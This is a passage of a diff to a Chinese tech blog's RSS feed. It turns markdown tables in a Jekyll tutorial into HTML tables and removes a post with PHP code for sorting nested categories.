-&lt;h3 id=&#34;4-jekyll简单介绍&#34;&gt;4. jekyll简单介绍&lt;/h3&gt;
+&lt;h3 id=&#34;jekyll简单介绍&#34;&gt;jekyll简单介绍&lt;/h3&gt;
 
 &lt;h4 id=&#34;目录结构&#34;&gt;目录结构&lt;/h4&gt;
 
@@ -136,17 +642,61 @@ https://ruby.taobao.org
 
 &lt;p&gt;结构说明：&lt;/p&gt;
 
-&lt;p&gt;| 文件目录  |  描述  |
-| &amp;mdash;&amp;mdash;&amp;mdash;&amp;mdash; | &amp;mdash;&amp;mdash;&amp;ndash; |
-| _config.yml  | 保存配置数据。 |
-| _drafts      | drafts 未发布的文章。 |
-| _includes   | 你可以加载这些包含部分到你的布局或者文章中以方便重用.这个标签{% include file.ext %} 来把文件 _includes/file.ext 包含进来。 |
-| _layouts   | layouts 是包裹在文章外部的模板。布局可以在 YAML 头信息中根据不同文章进行选择。 这将在下一个部分进行介绍。标签 {{ content }} 可以将content插入页面中 |
-| _posts   | 这里放的就是你的文章了 |
-| _data   | 存放全站全局变量。格式为yml或yaml。如果存放的文件为member.yml，那么访问里面的内容就是site.data.member |
-| _site   | 一旦 Jekyll 完成转换，就会将生成的页面放在这里（默认）。最好将这个目录放进你的 .gitignore 文件中。 |
-| index.html   | 全局首页 |
-| 其他文件   | 其他一些未被提及的目录和文件如  css 还有 images 文件夹， favicon.ico 等文件都将被完全拷贝到生成的 site 中 |&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;文件目录&lt;/th&gt;
+&lt;th&gt;描述&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;_config.yml&lt;/td&gt;
+&lt;td&gt;保存配置数据&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_drafts&lt;/td&gt;
+&lt;td&gt;drafts 未发布的文章&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_includes&lt;/td&gt;
+&lt;td&gt;你可以加载这些包含部分到你的布局或者文章中以方便重用.这个标签{% include file.ext %} 来把文件 _includes/file.ext 包含进来。&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_layouts&lt;/td&gt;
+&lt;td&gt;layouts 是包裹在文章外部的模板。布局可以在 YAML 头信息中根据不同文章进行选择。 这将在下一个部分进行介绍。标签 {{ content }} 可以将content插入页面中&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_posts&lt;/td&gt;
+&lt;td&gt;这里放的就是你的文章了&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_data&lt;/td&gt;
+&lt;td&gt;存放全站全局变量。格式为yml或yaml。如果存放的文件为member.yml，那么访问里面的内容就是site.data.member&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;_site&lt;/td&gt;
+&lt;td&gt;一旦 Jekyll 完成转换，就会将生成的页面放在这里（默认）。最好将这个目录放进你的 .gitignore 文件中&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;index.html&lt;/td&gt;
+&lt;td&gt;全局首页&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;其他文件&lt;/td&gt;
+&lt;td&gt;其他一些未被提及的目录和文件如,css 还有 images 文件夹， favicon.ico 等文件都将被完全拷贝到生成的 site 中&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;h4 id=&#34;配置说明&#34;&gt;配置说明&lt;/h4&gt;
 
@@ -176,17 +726,61 @@ version:          1.0.0
 
 &lt;p&gt;配置说明：&lt;/p&gt;
 
-&lt;p&gt;| 配置项 | 说明 |
-|:&amp;mdash;&amp;mdash;&amp;mdash;-|:&amp;mdash;&amp;mdash;&amp;ndash;:|
-| highlighter  | 高亮组件，一般选择pygments |
-| encoding     | 博客编码，一般贴写&amp;rdquo;utf-8&amp;rdquo; |
-| title        | 博客标题                 |
-| tagline      | 博客标语                 |
-| description  | 博客描述 |
-| url          | 博客地址 |
-| paginate     | 博客每页页数 |
-| paginate_path | 博客分页样式 |
-| gems     | 依赖哪些库 |&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;配置项&lt;/th&gt;
+&lt;th&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;highlighter&lt;/td&gt;
+&lt;td&gt;高亮组件，一般选择pygments&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;encoding&lt;/td&gt;
+&lt;td&gt;博客编码，一般贴写&amp;rdquo;utf-8&amp;rdquo;&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;title&lt;/td&gt;
+&lt;td&gt;博客标题&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;tagline&lt;/td&gt;
+&lt;td&gt;博客标语&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;description&lt;/td&gt;
+&lt;td&gt;博客描述&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;url&lt;/td&gt;
+&lt;td&gt;博客地址&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;paginate&lt;/td&gt;
+&lt;td&gt;博客每页页数&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;paginate_path&lt;/td&gt;
+&lt;td&gt;博客分页样式&lt;/td&gt;
+&lt;/tr&gt;
+
+&lt;tr&gt;
+&lt;td&gt;gems&lt;/td&gt;
+&lt;td&gt;博客分页样式&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
 
 &lt;h4 id=&#34;编写博客&#34;&gt;编写博客&lt;/h4&gt;
 
@@ -205,7 +799,7 @@ version:          1.0.0
 &lt;li&gt;&lt;p&gt;写好文档，直接推送至&lt;code&gt;github&lt;/code&gt;，等几分钟后就可以正常访问&lt;/p&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;h3 id=&#34;5-配置域名&#34;&gt;5. 配置域名&lt;/h3&gt;
+&lt;h3 id=&#34;配置域名&#34;&gt;配置域名&lt;/h3&gt;
 
 &lt;p&gt;如果需要自定义域名,可以直接将域名作&lt;code&gt;CNAME&lt;/code&gt;解析为 &lt;code&gt;username.github.io.&lt;/code&gt;,注意后面有个&lt;code&gt;.&lt;/code&gt;,几分钟后就可以用新的域名访问&lt;code&gt;github pages&lt;/code&gt;博客了&lt;/p&gt;
 </description>
@@ -1864,68 +2458,6 @@ var x2 = func2()
 x2[0](5)
 x2[1](5)
 &lt;/code&gt;&lt;/pre&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>无限级分类研究：（七）栏目的排序</title>
-      <link>http://www.yuzhan.me/post/2014-01-17-%E6%97%A0%E9%99%90%E7%BA%A7%E5%88%86%E7%B1%BB%E7%A0%94%E7%A9%B6%EF%BC%9A%EF%BC%88%E4%B8%83%EF%BC%89%E6%A0%8F%E7%9B%AE%E7%9A%84%E6%8E%92%E5%BA%8F/</link>
-      <pubDate>Fri, 17 Jan 2014 00:00:00 +0000</pubDate>
-      
-      <guid>http://www.yuzhan.me/post/2014-01-17-%E6%97%A0%E9%99%90%E7%BA%A7%E5%88%86%E7%B1%BB%E7%A0%94%E7%A9%B6%EF%BC%9A%EF%BC%88%E4%B8%83%EF%BC%89%E6%A0%8F%E7%9B%AE%E7%9A%84%E6%8E%92%E5%BA%8F/</guid>
-      <description>&lt;p&gt;昨天我们的程序完成之后，发觉，我们栏目完全无法按照list_order来排序。实际情况中，除非对排序要求不是很高的栏目，比如地区，职业行业等等信息，其他的如，商品栏目之类，都是需要排序。&lt;/p&gt;
-
-&lt;p&gt;因此，我们不能不能不去思考这个问题。当我们思考起这个问题时，有发觉难以下手。&lt;/p&gt;
-
-&lt;p&gt;那我们应该整理一下思路，&lt;/p&gt;
-
-&lt;p&gt;我们排序的规则如下: 父栏目 &amp;#8212;-&amp;gt; 子栏目&lt;/p&gt;
-
-&lt;p&gt;也就是说，父栏目排完，再把子栏目插入父栏目之中。我们似乎又得做循环插入的事情。如果用到递归，那么，我们这个程序似乎就不是那么完美。那有没有别的方法呢？&lt;/p&gt;
-
-&lt;p&gt;答案是有的。我们的思路是先组合一组栏目，再组合另一组，最后对每个组合进行排序，如下图&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&#34;http://www.yuzhan.me/public/img/images/2014/01/新排序方式思维图.jpg&#34; alt=&#34;新排序方式思维图&#34; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&amp;nbsp;&lt;/p&gt;
-
-&lt;p&gt;下面就加入我们的程序，&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;/**
- * 排序
- */
-function listorder()
-{
-    $array = array();
-    foreach($this-&amp;gt;data as $key =&amp;gt; $val)
-    {
-        // 查找该栏目的层级
-        $array = explode(&amp;quot;-&amp;quot;,$val[&#39;new_order&#39;]);
-        // 去除第一个栏目，因为最高级均为0，没有比较的意义
-        array_shift($array);
-        $order_arr = array();
-        foreach($array as $k =&amp;gt; $v)
-        {
-            //组装新排序，sprintf格式化数据
-            $order_arr[] = sprintf(&amp;quot;%03d&amp;quot;,$this-&amp;gt;data[$v][&#39;list_order&#39;]);
-        }
-        //插入原有数据，方便之后的排序
-        $this-&amp;gt;data[$key][&#39;order&#39;] = implode(&amp;quot;-&amp;quot;,$order_arr);
-    }
-    
-    //根据新的order对数组排序，如果大家的php版本低于5.3,请不要使用匿名函数
-    uasort($this-&amp;gt;data,function($a,$b){
-        if($a[&#39;order&#39;] == $b[&#39;order&#39;]) return 0;
-        return $a[&#39;order&#39;] &amp;gt; $b[&#39;order&#39;] ? 1 : -1;
-    });
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;以上程序就是排序。&lt;br /&gt;
-可以看出，我们这类方法，适合于输出。但是，对于排序以及修改和删除，比较麻烦。&lt;br /&gt;
-这个方法在此告一段落。&lt;/p&gt;
-
-&lt;p&gt;当然，我们的无限级分类还没结束，接下来，我们将有更精彩的讲解，请大家多多关注。&lt;/p&gt;
 </description>
     </item>
     
